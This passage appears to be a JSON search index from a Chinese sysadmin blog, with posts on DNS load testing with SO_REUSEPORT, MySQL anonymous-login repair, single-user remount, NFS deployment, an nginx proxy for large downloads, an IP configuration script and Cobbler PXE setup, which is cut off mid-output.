unbound代理NSD压测结论123在so-reuseport值为no的情况下，unbound代理NSD的并发稳定在2万qps，与bind 2.2万qps基本相当。在so-reuseport值为yes的情况下，unbound代理NSD的并发稳定在5万qps，远超2万qps。 unbound关于so-reuseport官网解释12345678910so-reuseport: &lt;yes or no&gt; If yes, then open dedicated listening sockets for incoming queries for each thread and try to set the SO_REUSEPORT socket option on each socket. May distribute incoming queries to threads more evenly. Default is no. On Linux it is supported in kernels &gt;&#x3D; 3.9. On other systems, FreeBSD, OSX it may also work. You can enable it (on any platform and kernel), it then attempts to open the port and passes the option if it was avail- able at compile time, if that works it is used, if it fails, it continues silently (unless verbosity 3) without the option. 关于SO_REUSEPORT特性该特性描述及解决的问题12345SO_REUSEPORT支持多个进程或者线程绑定到同一端口，提高服务器程序的性能！SO_REUSEPORT特性-解决的问题：为了让多线程&#x2F;多进程服务器的每个线程都listen同一个端口，并且最终每个线程拥有一个独立的socket，而不是所有线程都访问一个socket。 检查当前linux内核是否支持SO-REUSEPORT【理论内核≥3.9默认即支持此特性，无需重新编译内核开启】1234[root@ns1 ~]# cat &#x2F;usr&#x2F;include&#x2F;asm-generic&#x2F;socket.h |grep &quot;REUSEPORT&quot;#define SO_REUSEPORT 15出现如上结果则说明，当前内核支持SO_REUSEPORT特性【但不代表程序均支持，还需要看程序是否有so_reuseport或reuseport相关参数进行调用】 注：若出现如下注释内容，则说明不支持123# cat &#x2F;usr&#x2F;include&#x2F;asm-generic&#x2F;socket.h |grep &quot;REUSEPORT&quot;&#x2F;* To add :#define SO_REUSEPORT 15 *&#x2F;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"bind","slug":"bind","permalink":"https://garywu520.github.io/tags/bind/"},{"name":"bind9","slug":"bind9","permalink":"https://garywu520.github.io/tags/bind9/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"DNS性能瓶颈","slug":"DNS性能瓶颈","permalink":"https://garywu520.github.io/tags/DNS%E6%80%A7%E8%83%BD%E7%93%B6%E9%A2%88/"},{"name":"unbound","slug":"unbound","permalink":"https://garywu520.github.io/tags/unbound/"},{"name":"NSD","slug":"NSD","permalink":"https://garywu520.github.io/tags/NSD/"}]},{"title":"mysql故障处理之匿名登陆问题","slug":"MySQL故障处理之匿名登陆问题","date":"2017-08-22T10:33:59.000Z","updated":"2018-01-08T09:22:19.108Z","comments":true,"path":"2017/08/22/MySQL故障处理之匿名登陆问题/","link":"","permalink":"https://garywu520.github.io/2017/08/22/MySQL%E6%95%85%E9%9A%9C%E5%A4%84%E7%90%86%E4%B9%8B%E5%8C%BF%E5%90%8D%E7%99%BB%E9%99%86%E9%97%AE%E9%A2%98/","excerpt":"mysql创建数据库的时候出现了ERROR 1044 (42000): Access denied的错误。 原因：因为mysql数据库的user表里，存在用户名为空的账户即匿名账户，导致登录的时候是虽然用的是root，但实际是匿名登录的，通过错误提示里的‘’@’localhost’可以看出来。","text":"mysql创建数据库的时候出现了ERROR 1044 (42000): Access denied的错误。 原因：因为mysql数据库的user表里，存在用户名为空的账户即匿名账户，导致登录的时候是虽然用的是root，但实际是匿名登录的，通过错误提示里的‘’@’localhost’可以看出来。 1234错误提示：mysql&gt; mysql&gt; create database dba;ERROR 1044 (42000): Access denied for user &#39;&#39;@&#39;localhost&#39; to database &#39;dba&#39; 解决方案： 1234567891011121) 关闭mysql # service mysqld stop 2) 屏蔽权限 # mysqld_safe --skip-grant-table 屏幕出现： Starting demo from ..... 3) 新开起一个终端输入 # mysql -u root mysql mysql&gt; delete from user where USER&#x3D;&#39;&#39;; mysql&gt; FLUSH PRIVILEGES; &#x2F;&#x2F;刷新数据库 mysql&gt;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mysql","slug":"mysql","permalink":"https://garywu520.github.io/tags/mysql/"},{"name":"Error1044","slug":"Error1044","permalink":"https://garywu520.github.io/tags/Error1044/"}]},{"title":"单用户模式下mount -o remount,rw / 用途","slug":"单用户模式下mount-o-remount-rw-用途","date":"2017-08-19T10:33:28.000Z","updated":"2017-08-19T10:47:28.493Z","comments":true,"path":"2017/08/19/单用户模式下mount-o-remount-rw-用途/","link":"","permalink":"https://garywu520.github.io/2017/08/19/%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E4%B8%8Bmount-o-remount-rw-%E7%94%A8%E9%80%94/","excerpt":"linux系统在无法启动时候，进入单用户模式后，我们的/文件系统是只读模式，无法进行修改，那么这个时候我们就需要用到一条命令：mount –o remount,rw / 这个命令来让我们的/目录文件系统为可读写模式，这样就可以实现自由修改了。","text":"linux系统在无法启动时候，进入单用户模式后，我们的/文件系统是只读模式，无法进行修改，那么这个时候我们就需要用到一条命令：mount –o remount,rw / 这个命令来让我们的/目录文件系统为可读写模式，这样就可以实现自由修改了。 12345678910111213例如：我修改了&#x2F;etc&#x2F;fstab根目录的uuid或者被黑客攻击，重启后，系统就起不来了提示：give root password for maintenance (or type control-d to continue:)解决方法：按照提示输入root 密码后,进入系统[root@nfs01 ~]# mount -o remount,rw &#x2F;because root directory &#x2F; is mounted inread only mode. type follwing command, then you should be able to editrc.sysint script.现在再去修改&#x2F;etc&#x2F;fstab文件就可以了.最后reboot , 系统启动成功。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"单用户模式","slug":"单用户模式","permalink":"https://garywu520.github.io/tags/%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/"},{"name":"只读模式","slug":"只读模式","permalink":"https://garywu520.github.io/tags/%E5%8F%AA%E8%AF%BB%E6%A8%A1%E5%BC%8F/"},{"name":"fatab","slug":"fatab","permalink":"https://garywu520.github.io/tags/fatab/"},{"name":"mount","slug":"mount","permalink":"https://garywu520.github.io/tags/mount/"},{"name":"remount","slug":"remount","permalink":"https://garywu520.github.io/tags/remount/"}]},{"title":"NFS文件存储系统-部署","slug":"NFS文件存储系统-部署","date":"2017-08-19T02:07:15.000Z","updated":"2017-08-21T01:22:22.757Z","comments":true,"path":"2017/08/19/NFS文件存储系统-部署/","link":"","permalink":"https://garywu520.github.io/2017/08/19/NFS%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F-%E9%83%A8%E7%BD%B2/","excerpt":"NFS工作流程","text":"NFS工作流程 123NFS（文件存储系统）服务器启动后会随机启动N个进程并生成N个随机端口，NFS服务启动后首先会向PRC服务注册，注册后这些NFS进程和端口信息由RPC(类似房产中介)统一管理，然后NFS客户端统一使用RPC端口与NFS服务进行通信。rpc服务端口号：111服务启动：&#x2F;etc&#x2F;init.d&#x2F;rpcbind start 环境： NFS服务器：172.16.1.31 NFS服务端部署123456# 检查nfs和rpc是否安装(注：CentOS5 rpcbind软件为portmap)rpm -qa nfs-utils rpcbindyum install -y nfs-utils rpcbind#查看安装了哪些软件rpm -ql nfs-utils rpcbind 启动NFS文件系统服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#先启动rpc服务&#x2F;etc&#x2F;init.d&#x2F;rpcbind startchkconfig rpcbind on#再启动nfs服务&#x2F;etc&#x2F;init.d&#x2F;nfs startchkconfig nfs on#查看nfs服务注册端口信息[root@nfs01 ~]# rpcinfo -p localhost#新建配置文件cat &gt;&gt;&#x2F;etc&#x2F;exports&lt;&lt;EOF&#x2F;data 172.16.1.0&#x2F;24(rw,sync,all_squash)EOF############################################参数释义：&#x2F;home&#x2F;nfs&#x2F;share 为共享的目录，使用绝对路径。192.168.1.0&#x2F;24或10.10.10.1&#x2F;32 允许访问的客户端主机IPrw：read-write，可读写；ro：read-only，只读；sync：文件直接写入硬盘；-- 同步数据async：文件暂存内存，再写入磁盘；数据易丢失 -- 异步同步no_root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，也拥有root权限。显然开启这项是不安全的。root_squash：NFS客户端连接服务端时如果使用的是root的话，那么对服务端分享的目录来说，拥有匿名用户权限，通常他将使用nobody或nfsnobody身份；all_squash：不论NFS客户端连接服务端时使用什么用户，对服务端分享的目录来说都是拥有nfsnobody身份用户权限；anonuid：指定匿名用户；anongid：匿名用户的GID值。###############################################创建共享目录mkdir &#x2F;data -p#检查NFS共享目录管理专用用户id nfsnobody#授权chown -R nfsnobody:nfsnobody &#x2F;datals -ld &#x2F;datadrwxr-xr-x 2 nfsnobody nfsnobody 4096 Aug 5 22:19 &#x2F;data#重启nfs服务(只修改了NFS信息，所以无需重启rpc服务)&#x2F;etc&#x2F;init.d&#x2F;nfs reload 平滑重启#排错[root@nfs01 data]# rpcinfo -p localhost #检查nfs服务注册端口信息[root@nfs01 data]# showmount -e 172.16.1.31 #检查共享目录Export list for 172.16.1.31:&#x2F;data&#x2F;r 172.16.1.41&#x2F;32&#x2F;data&#x2F;w 172.16.1.8&#x2F;32[root@nfs01 data]# mount -t nfs 172.16.1.31:&#x2F;data &#x2F;mnt #本地挂载测试[root@nfs01 data]# df -h 1234567891011121314151617181920查看服务器进程[root@nfs01 mnt]# ps -ef |egrep &quot;rpc|nfs&quot;rpc 2847 1 0 22:12 ? 00:00:00 rpcbindroot 2902 2 0 22:14 ? 00:00:00 [rpciod&#x2F;0]root 2903 2 0 22:14 ? 00:00:00 [rpciod&#x2F;1]root 2912 1 0 22:14 ? 00:00:00 rpc.mountdroot 2919 2 0 22:14 ? 00:00:00 [nfsd4]root 2920 2 0 22:14 ? 00:00:00 [nfsd4_callbacks]root 2921 2 0 22:14 ? 00:00:00 [nfsd]root 2922 2 0 22:14 ? 00:00:00 [nfsd]root 2923 2 0 22:14 ? 00:00:00 [nfsd]root 2924 2 0 22:14 ? 00:00:00 [nfsd]root 2925 2 0 22:14 ? 00:00:00 [nfsd]root 2926 2 0 22:14 ? 00:00:00 [nfsd]root 2927 2 0 22:14 ? 00:00:00 [nfsd]root 2928 2 0 22:14 ? 00:00:00 [nfsd]root 2959 1 0 22:14 ? 00:00:00 rpc.idmapdroot 3045 2 0 22:32 ? 00:00:00 [nfsiod]root 3046 2 0 22:32 ? 00:00:00 [nfsv4.0-svc]root 3112 2692 0 22:58 pts&#x2F;0 00:00:00 egrep rpc|nfs 客户端配置（多个客户端可多次挂载）1234567891011121314# 检查nfs和rpc是否安装(注：CentOS5 rpcbind软件为portmap)rpm -qa nfs-utils rpcbindyum install -y nfs-utils rpcbind#注：如果不安装nfs-utils软件就没有showmount命令，也没有不能正常挂载nfs。但服务无需启动！showmount -e 172.16.1.31 #查看共享mount -t nfs 172.16.1.31:&#x2F;data &#x2F;mnt #挂载共享df -h #查看#卸载共享目录方式1:退出共享目录方式2:在共享目录强制卸载命令：umount -lf &#x2F;mnt --l参数表示懒惰的卸载；-f参数表示强制卸载 修改共享目录管理用户（不使用默认的nfsnobody）-实践123456789101112131415161718####服务端测试#创建指定匿名用户注：要求服务端与客户端的匿名用户uid和gid必须一致useradd -s &#x2F;sbin&#x2F;nologin -M www -u 888[root@nfs01 mnt]# id wwwuid&#x3D;888(www) gid&#x3D;888(www) groups&#x3D;888(www)#修改配置文件vim &#x2F;etc&#x2F;exports&#x2F;data 172.16.1.0&#x2F;24(rw,sync,all_squash,anonuid&#x3D;888,anongid&#x3D;888)#重新授权共享目录chown -R www:www &#x2F;data#重启nfs服务&#x2F;etc&#x2F;init.d&#x2F;nfs reload 12345678910111213141516171819客户端-挂载测试mount -t nfs 172.16.1.31:&#x2F;data &#x2F;mntcd &#x2F;mnttouch 111.txt [root@web01 mnt]# ls -ltotal 0-rw-r--r-- 1 nobody nobody 0 Aug 6 01:37 111.txt#查看发现文件的属主属组依然是之前的nobody，因为默认匿名用户变化时要与服务端的匿名用户uid和gid必须一致#创建用户并指定uid和gid为888[root@web01 mnt]# useradd -s &#x2F;sbin&#x2F;nologin -M www -u 888接下来是个重点了...否则不生效。。。服务端与客户端需要同时重启以下rpc服务&#x2F;etc&#x2F;init.d&#x2F;rpcidmapd restart然后，客户端等待约2-3分钟，再次挂载，里面的文件属主属组就变为了wwwmount -t nfs 172.16.1.31:&#x2F;data &#x2F;mnt 客户端挂载排错思路123456789101112131. 检查服务端NFS进程（房源）等信息 rpcinfo -p 172.16.1.31 如果没有注册房源信息，原因可能如下： 1) 服务器：nfs服务没有启动 2) 服务器：nfs服务与rpc服务启动顺序不正确。 2. 检查服务端共享目录信息是否存在 showmount -e 172.16.1.31 如果共享目录没有，可能是nfs配置文件编写错误 3. 直接进行目录挂载测试 mount -t nfs 172.16.1.31:&#x2F;data &#x2F;mnt 挂载后进入挂载点创建或编辑文件测试权限 客户端-系统开机自动挂载12345678910方式1：echo &quot;&#x2F;bin&#x2F;mount -t nfs 172.16.1.31:&#x2F;data &#x2F;mnt&quot; &gt;&gt;&#x2F;etc&#x2F;rc.local方式2：vim &#x2F;etc&#x2F;fstab172.16.1.31:&#x2F;data&#x2F;r &#x2F;data&#x2F;r nfs defaults 0 0注：系统启动过程中，&#x2F;etc&#x2F;fstab在系统网卡启动之前被加载，所以系统启动后NFS挂载失败。解决方案：配合netfs服务实现&#x2F;etc&#x2F;fstab开机启动之后进行重新加载开机自启动netfs服务chkconfig netfs on 客户端参数-扩展1234567891011mount挂载时使用以下参数：rsize 单位:bytes；高并发请求时，读取内存缓存可以降低磁盘IO，比如:200000bytes 200M wsize 单位:bytes；高并发请求时，读取内存缓存可以降低磁盘IO注：具体大小由内存总量以及业务整体使用占比而定示例：[root@web01 ~]# mount -t nfs -o rsize&#x3D;20000,wsize&#x3D;20000 172.16.1.31:&#x2F;data&#x2F;w &#x2F;data&#x2F;wexec 文件具有可执行权限noexec 文件无可执行权限（推荐）示例：mount -t nfs -o noexec,rsize&#x3D;20000,wsize&#x3D;20000 172.16.1.31:&#x2F;data&#x2F;w &#x2F;data&#x2F;w 系统进入只读模式-修复123456remount命令案例：系统意外进入只读模式修复方案：在root用户下mount -o remount,rw &#x2F; #重新挂载为读写模式remoot 扩展-使用命令共享目录123456789101112131415161718exportfs -o rw,sync 172.16.1.0&#x2F;24:&#x2F;datashowmount -e localhost #查看共享目录信息注；命令方式共享目录可以临时生效，重启服务共享则消失。##################################################&#x2F;etc&#x2F;init.d&#x2F;nfs restart注：nfs服务器使用上述命令重启后，冷却时间需要等待90秒（无敌时间），之后客户端进行挂载后，才能进行写入操作。此文件中有指定,可以进行修改:vim &#x2F;etc&#x2F;sysconfig&#x2F;nfs #NFSD_V4_GRACE&#x3D;90#NFSD_V4_LEASE&#x3D;90#NLM_GRACE_PERIOD&#x3D;90################################################客户端实际挂载与否，不能依据df -h，需要查看cat &#x2F;proc&#x2F;mounts。df -h没有的话，如果&#x2F;proc&#x2F;mounts文件中还存在挂载信息的话，就需要再多次卸载。否则再次挂载会出现“Stale file handle”的错误 其他12345678#查看默认nfs服务端配置文件信息（如果定义了&#x2F;etc&#x2F;exports文件后，优先使用&#x2F;etc&#x2F;exports文件）[root@nfs01 ~]# cat &#x2F;var&#x2F;lib&#x2F;nfs&#x2F;etab注：在配置共享目录时，需要考虑共享目录的权限；如果存在多级目录，数据存储也会受到上级目录的权限影响。PS：suid命令，当一个普通用户没有权限查看root权限文件内容，给命令添加s权限后，就可以查看了。-- 不常用 NFS单点故障问题123drbd+heartbeat 可以解决NFS单点故障。对于大中小网站（参考点：2000万以下的PV）可以使用NFS文件存储系统。 用户压缩映射-流程图 两种映射方式 (1) all_squash (2) all_squash root_squash","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"fastdfs","slug":"fastdfs","permalink":"https://garywu520.github.io/tags/fastdfs/"},{"name":"nfs","slug":"nfs","permalink":"https://garywu520.github.io/tags/nfs/"},{"name":"分布式存储","slug":"分布式存储","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8/"}]},{"title":"exit退出状态码的另类应用","slug":"exit退出状态码的另类应用","date":"2017-08-18T10:29:44.000Z","updated":"2017-08-18T10:43:02.475Z","comments":true,"path":"2017/08/18/exit退出状态码的另类应用/","link":"","permalink":"https://garywu520.github.io/2017/08/18/exit%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81%E7%9A%84%E5%8F%A6%E7%B1%BB%E5%BA%94%E7%94%A8/","excerpt":"在企业生产环境中使用的脚本，一般会定义一个exit退出状态码。 检测什么并不重要，重要的是环境标准化要求脚本只能执行一次，第二次执行将会出现错误。所以会定义exit退出状态码防止脚本循环执行。例如：","text":"在企业生产环境中使用的脚本，一般会定义一个exit退出状态码。 检测什么并不重要，重要的是环境标准化要求脚本只能执行一次，第二次执行将会出现错误。所以会定义exit退出状态码防止脚本循环执行。例如： 12345rpm -q saltif [ $? -eq 0 ];then exit 100fi 上面的示例意思是：如果salt存在，则退出脚本，退出状态码100。因为首次执行的时候是没有salt软件的，软件在脚本的下面才会安装。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"exit退出码","slug":"exit退出码","permalink":"https://garywu520.github.io/tags/exit%E9%80%80%E5%87%BA%E7%A0%81/"},{"name":"shell编程","slug":"shell编程","permalink":"https://garywu520.github.io/tags/shell%E7%BC%96%E7%A8%8B/"}]},{"title":"关于apache大文件下载的坑","slug":"关于apache大文件下载的坑","date":"2017-08-18T10:28:52.000Z","updated":"2017-08-18T11:06:39.462Z","comments":true,"path":"2017/08/18/关于apache大文件下载的坑/","link":"","permalink":"https://garywu520.github.io/2017/08/18/%E5%85%B3%E4%BA%8Eapache%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%9D%91/","excerpt":"关于apache目录浏览配置，参考：Apache目录浏览功能-部署","text":"关于apache目录浏览配置，参考：Apache目录浏览功能-部署 今天要下载一个8.3G的数据库压缩文件，使用apache目录浏览方式。但是一直无法下载，小文件可以。 1234解决思路：1. 查看日志有无报错。如果日志没有错误，说明apache配置正常，工作正常。2. 使用其他网络下载测试，如果测试OK，那么可以判断是由于IDC机房网络路由配置等原因造成。3. 其他尝试方法，配置nginx反代apache的http地址测试(我的问题在这一步解决) nginx反代配置1234567891011121314151617181920212223242526272829#找一台安装并运行的nginx服务器进行如下配置cd &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;vim download.conf#----------------------------------------------upstream down &#123; server apache服务器ip:apache端口;&#125;server &#123; listen nginx服务器ip:nginx端口; #server_name _; proxy_set_header Host $http_host; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;down_access.log main; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;down_error.log warn; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;down&#x2F;; &#125;&#125;#---------------------------------------------------&#x2F;etc&#x2F;init.d&#x2F;nginx reload 客户端下载123下载数据大，开启tmuxtime wget --http-user&#x3D;user --http-passwd&#x3D;passwd http:&#x2F;&#x2F;nginx映射的外网ip:nginx反代端口&#x2F;data.zip 反思1尽量利用线上机房现有资源进行解决问题，实在是死胡同再考虑更换其他方案。往往方法是有，只是自我放弃！切记！","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"apache","slug":"apache","permalink":"https://garywu520.github.io/tags/apache/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"}]},{"title":"ip自动配置脚本","slug":"ip自动配置脚本","date":"2017-08-18T04:28:26.000Z","updated":"2017-08-18T06:08:42.797Z","comments":true,"path":"2017/08/18/ip自动配置脚本/","link":"","permalink":"https://garywu520.github.io/2017/08/18/ip%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E8%84%9A%E6%9C%AC/","excerpt":"无聊写个ip自动配置脚本，能力有限勿喷。可以在此基础上进行完善","text":"无聊写个ip自动配置脚本，能力有限勿喷。可以在此基础上进行完善 123456789101112131415161718192021#!&#x2F;bin&#x2F;bash# by garywu - 2017.8.18read -p &quot;请输入IP地址: &quot; ipnet_path&#x3D;&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth0if [[ $ip -gt 0 &amp;&amp; $ip -le 254 ]];then sed -i &#39;s#BOOTPROTO&#x3D;dhcp#BOOTPROTO&#x3D;static#g&#39; $net_path echo &quot;IPADDR&#x3D;192.168.10.$ip&quot; &gt;&gt; $net_path echo &quot;NETMASK&#x3D;255.255.255.0&quot; &gt;&gt; $net_path echo &quot;GATEWAY&#x3D;192.168.10.1&quot; &gt;&gt; $net_path echo &quot;DNS1&#x3D;114.114.114.114&quot; &gt;&gt; $net_path echo &quot;配置成功！&quot; cat $net_dir &#x2F;etc&#x2F;init.d&#x2F;network restartelse echo &quot;用法: sh $0&quot;fi","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell脚本","slug":"shell脚本","permalink":"https://garywu520.github.io/tags/shell%E8%84%9A%E6%9C%AC/"},{"name":"ip自动配置","slug":"ip自动配置","permalink":"https://garywu520.github.io/tags/ip%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE/"}]},{"title":"Cobbler自动化系统部署","slug":"Cobbler自动化系统部署","date":"2017-08-15T08:50:08.000Z","updated":"2017-08-24T05:31:46.282Z","comments":true,"path":"2017/08/15/Cobbler自动化系统部署/","link":"","permalink":"https://garywu520.github.io/2017/08/15/Cobbler%E8%87%AA%E5%8A%A8%E5%8C%96%E7%B3%BB%E7%BB%9F%E9%83%A8%E7%BD%B2/","excerpt":"Cobbler是一个Linux服务器安装的服务，可以通过网络启动(PXE)的方式来快速安装、重装物理服务器和虚拟机，同时还可以管理DHCP，DNS等。Cobbler可以使用命令行方式管理，也提供了基于Web的界面管理工具(cobbler-web)，还提供了API接口，可以方便二次开发使用。","text":"Cobbler是一个Linux服务器安装的服务，可以通过网络启动(PXE)的方式来快速安装、重装物理服务器和虚拟机，同时还可以管理DHCP，DNS等。Cobbler可以使用命令行方式管理，也提供了基于Web的界面管理工具(cobbler-web)，还提供了API接口，可以方便二次开发使用。 cobbler工作原理 环境准备1234567891011121314151617181920212223242526271. 查看系统版本 [root@cobbler-9 ~]# cat &#x2F;etc&#x2F;redhat-release CentOS Linux release 7.3.1611 (Core) 2. 内核版本 [root@cobbler-9 ~]# uname -a Linux cobbler-9 3.10.0-514.el7.x86_64 3. 关闭selinux [root@cobbler-9 ~]# getenforce Permissive [root@cobbler-9 ~]# cat &#x2F;etc&#x2F;selinux&#x2F;config SELINUX&#x3D;disabled4. 停止firewalld防火墙 [root@cobbler-9 ~]# systemctl stop firewalld.service [root@cobbler-9 ~]# systemctl disable firewalld.service 5. 主机名 [root@cobbler-9 ~]# hostname cobbler-9 6. 安装yum源 mv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup wget -O &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;repo&#x2F;Centos-7.repo yum clean all &amp;&amp; yum makecache 安装cobbler12345678[root@cobbler-9 ~]# yum install cobbler cobbler-web pykickstart httpd dhcp tftp xinetd -ycobbler #Cobbler程序包cobbler-web #Cobbler的web服务包pykickstart #Cobbler检查kickstart语法错误httpd #Apache web服务dhcp #Dhcp服务tftp #Tftp服务 重要配置文件注释123456789101112131415161718192021222324[root@cobbler-9 ~]# rpm -ql cobbler&#x2F;etc&#x2F;cobbler # 配置文件目录&#x2F;etc&#x2F;cobbler&#x2F;settings # cobbler主配置文件，这个文件是YAML格式，Cobbler是python写的程序。&#x2F;etc&#x2F;cobbler&#x2F;dhcp.template # DHCP服务的配置模板&#x2F;etc&#x2F;cobbler&#x2F;tftpd.template # tftp服务的配置模板&#x2F;etc&#x2F;cobbler&#x2F;rsync.template # rsync服务的配置模板&#x2F;etc&#x2F;cobbler&#x2F;iso # iso模板配置文件目录&#x2F;etc&#x2F;cobbler&#x2F;pxe # pxe模板文件目录&#x2F;etc&#x2F;cobbler&#x2F;power # 电源的配置文件目录&#x2F;etc&#x2F;cobbler&#x2F;users.conf # Web服务授权配置文件&#x2F;etc&#x2F;cobbler&#x2F;users.digest # 用于web访问的用户名密码配置文件&#x2F;etc&#x2F;cobbler&#x2F;dnsmasq.template # DNS服务的配置模板&#x2F;etc&#x2F;cobbler&#x2F;modules.conf # Cobbler模块配置文件&#x2F;var&#x2F;lib&#x2F;cobbler # Cobbler数据目录&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;config # 配置文件&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;kickstarts # 默认存放kickstart文件&#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;loaders # 存放的各种引导程序&#x2F;var&#x2F;www&#x2F;cobbler # 系统安装镜像目录&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;ks_mirror # 导入的系统镜像列表&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;images # 导入的系统镜像启动文件&#x2F;var&#x2F;www&#x2F;cobbler&#x2F;repo_mirror # yum源存储目录&#x2F;var&#x2F;log&#x2F;cobbler # 日志目录&#x2F;var&#x2F;log&#x2F;cobbler&#x2F;install.log # 客户端系统安装日志&#x2F;var&#x2F;log&#x2F;cobbler&#x2F;cobbler.log # cobbler日志 启动服务123456789cobbler的运行依赖于dhcp、tftp、rsync及dns服务。[root@cobbler-9 ~]# systemctl start httpd[root@cobbler-9 ~]# systemctl enable httpd[root@cobbler-9 ~]# systemctl start cobblerd[root@cobbler-9 ~]# systemctl enable cobblerd[root@cobbler-9 ~]# ss -lntup |grep cobblerd 检查cobbler的配置123456789101112131415161718192021222324252627282930313233[root@cobbler-9 ~]# cobbler check针对出现的问题逐一解决：问题1：修改&#x2F;etc&#x2F;cobbler&#x2F;settings文件中--提供cobbler服务的主机相应的IP地址或主机名[root@cobbler-9 ~]# sed -i &#39;s&#x2F;server: 127.0.0.1&#x2F;server: 10.10.0.10&#x2F;&#39; &#x2F;etc&#x2F;cobbler&#x2F;settings[root@cobbler-9 ~]# grep 10.10.0.10 &#x2F;etc&#x2F;cobbler&#x2F;settings next_server: 10.10.0.10server: 10.10.0.10问题2：修改&#x2F;etc&#x2F;xinetd.d&#x2F;tftp修改disable &#x3D; no问题3：按照提示执行“cobbler get-loaders” 下载loaders[root@cobbler-9 ~]# cobbler get-loaders[root@cobbler-9 ~]# ls &#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;loaders&#x2F; 查看下载内容问题4：按照提示执行&quot;systemctl enable rsyncd&quot;[root@cobbler-9 ~]# systemctl start rsyncd[root@cobbler-9 ~]# systemctl enable rsyncd问题5：创建cobbler默认系统用户及密码[root@cobbler-9 ~]# openssl passwd -1 -salt &#39;root&#39; &#39;passwd&#39;$1$root$CZ.bdnz2SUozLTg0W7Yhm1修改密码为刚创建的新密码[root@cobbler-9 ~]# grep default_password &#x2F;etc&#x2F;cobbler&#x2F;settingsdefault_password_crypted: &quot;$1$root$CZ.bdnz2SUozLTg0W7Yhm1&quot;重启cobbler后再检查[root@cobbler-9 ~]# systemctl restart cobblerd[root@cobbler-9 ~]# cobbler check此时，还剩下最后两项，一个是与debian系统相关，另一个是电影管理设备相关，此处暂不做调整。 配置DHCP1234567891011此参数为1时表示使用，cobbler管理dhcp[root@cobbler-9 ~]# sed -i &#39;s#manage_dhcp: 0#manage_dhcp: 1#g&#39; &#x2F;etc&#x2F;cobbler&#x2F;settings[root@cobbler-9 ~]# vim &#x2F;etc&#x2F;cobbler&#x2F;dhcp.template#仅列出修改过的部分subnet 10.10.0.0 netmask 255.255.255.0 &#123; option routers 10.10.0.1; option domain-name-servers 10.10.0.1; option subnet-mask 255.255.255.0; range dynamic-bootp 10.10.0.100 10.10.0.254; #next-server $next_server; next-server 10.10.0.10; 同步cobbler配置12345678910111213141516171819#同步最新cobbler配置，它会根据配置自动修改dhcp等服务。[root@cobbler-9 ~]# systemctl restart xinetd[root@cobbler-9 ~]# systemctl enable xinetd[root@cobbler-9 ~]# systemctl restart cobblerd[root@cobbler-9 ~]# cobbler sync......running python trigger cobbler.modules.scm_trackrunning shell triggers from &#x2F;var&#x2F;lib&#x2F;cobbler&#x2F;triggers&#x2F;change&#x2F;**** TASK COMPLETE ***#查看dhcp配置文件的标注开头证明自己由Cobbler管理[root@cobbler-9 ~]# less &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf # ******************************************************************# Cobbler managed dhcpd.conf file# generated from cobbler dhcp.conf template (Tue Aug 15 12:16:44 2017)# Do NOT make changes to &#x2F;etc&#x2F;dhcpd.conf. Instead, make your changes# in &#x2F;etc&#x2F;cobbler&#x2F;dhcp.template, as &#x2F;etc&#x2F;dhcpd.conf will be# overwritten.# ****************************************************************** cobbler的命令行管理 查看帮助 123456[root@cobbler-9 ~]# cobblerusage&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;cobbler &lt;distro|profile|system|repo|image|mgmtclass|package|file&gt; ... [add|edit|copy|getks*|list|remove|rename|report] [options|--help]cobbler 